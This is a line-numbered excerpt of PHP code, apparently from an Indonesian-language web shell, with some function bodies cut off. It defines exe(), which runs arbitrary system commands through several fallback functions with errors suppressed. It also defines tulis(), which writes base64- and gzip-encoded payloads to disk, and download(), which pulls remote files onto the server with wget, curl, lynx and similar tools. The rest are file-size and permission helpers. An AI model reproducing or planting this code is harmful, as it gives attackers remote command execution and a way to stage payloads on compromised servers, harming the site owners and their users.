 142 function rapih($text) {

 145 function magicboom($text) {
 146     if (!get_magic_quotes_gpc()) {
 147         return $text;

 219 function ukuran($file) {
 220     if ($size = @filesize($file)) {
 221         if ($size <= 1024) return $size;
 222         else {
 223             if ($size <= 1024 * 1024) {
 224                 $size = @round($size / 1024, 2);;
 225                 return "$size kb";
 226             } else {
 227                 $size = @round($size / 1024 / 1024, 2);
 228                 return "$size mb";
 229             }
 230         }
 231     } else return "???";
 232 }
 233 function exe($cmd) {
 234     if (function_exists('system')) {
 235         @ob_start();
 236         @system($cmd);
 237         $buff = @ob_get_contents();
 238         @ob_end_clean();
 239         return $buff;
 240     } elseif (function_exists('exec')) {
 241         @exec($cmd, $results);
 242         $buff = "";
 243         foreach ($results as $result) {
 244             $buff.= $result;
 245         }
 246         return $buff;
 247     } elseif (function_exists('passthru')) {
 248         @ob_start();
 249         @passthru($cmd);
 250         $buff = @ob_get_contents();
 251         @ob_end_clean();
 252         return $buff;
 253     } elseif (function_exists('shell_exec')) {
 254         $buff = @shell_exec($cmd);
 255         return $buff;
 256     }
 257 }
 258 function tulis($file, $text) {
 259     $textz = gzinflate(base64_decode($text));
 260     if ($filez = @fopen($file, "w")) {
 261         @fputs($filez, $textz);
 262         @fclose($file);
 263     }
 264 }
 265 function ambil($link, $file) {
 266     if ($fp = @fopen($link, "r")) {
 267         while (!feof($fp)) {
 268             $cont.= @fread($fp, 1024);
 269         }
 270         @fclose($fp);
 271         $fp2 = @fopen($file, "w");
 272         @fwrite($fp2, $cont);
 273         @fclose($fp2);
 274     }
 275 }
 276 function which($pr) {
 277     $path = exe("which $pr");
 278     if (!empty($path)) {
 279         return trim($path);
 280     } else {
 281         return trim($pr);
 282     }
 283 }
 284 function download($cmd, $url) {
 285     $namafile = basename($url);
 286     switch ($cmd) {
 287         case 'wwget':
 288             exe(which('wget') . " " . $url . " -O " . $namafile);
 289         break;
 290         case 'wlynx':
 291             exe(which('lynx') . " -source " . $url . " > " . $namafile);
 292         break;
 293         case 'wfread':
 294             ambil($wurl, $namafile);
 295         break;
 296         case 'wfetch':
 297             exe(which('fetch') . " -o " . $namafile . " -p " . $url);
 298         break;
 299         case 'wlinks':
 300             exe(which('links') . " -source " . $url . " > " . $namafile);
 301         break;
 302         case 'wget':
 303             exe(which('GET') . " " . $url . " > " . $namafile);
 304         break;
 305         case 'wcurl':
 306             exe(which('curl') . " " . $url . " -o " . $namafile);
 307         break;
 308         default:
 309         break;
 310     }
 311     return $namafile;
 312 }
 313 function get_perms($file) {
 314     if ($mode = @fileperms($file)) {
 315         $perms = '';
 316         $perms.= ($mode & 00400) ? 'r' : '-';
 317         $perms.= ($mode & 00200) ? 'w' : '-';
 318         $perms.= ($mode & 00100) ? 'x' : '-';
 319         $perms.= ($mode & 00040) ? 'r' : '-';
 320         $perms.= ($mode & 00020) ? 'w' : '-';
 321         $perms.= ($mode & 00010) ? 'x' : '-';
 322         $perms.= ($mode & 00004) ? 'r' : '-';
 323         $perms.= ($mode & 00002) ? 'w' : '-';
 324         $perms.= ($mode & 00001) ? 'x' : '-';
 325         return $perms;
 326     } else return "??????????";
 327 }
 328 function clearspace($text) {
 329     return str_replace(" ", "_", $text);
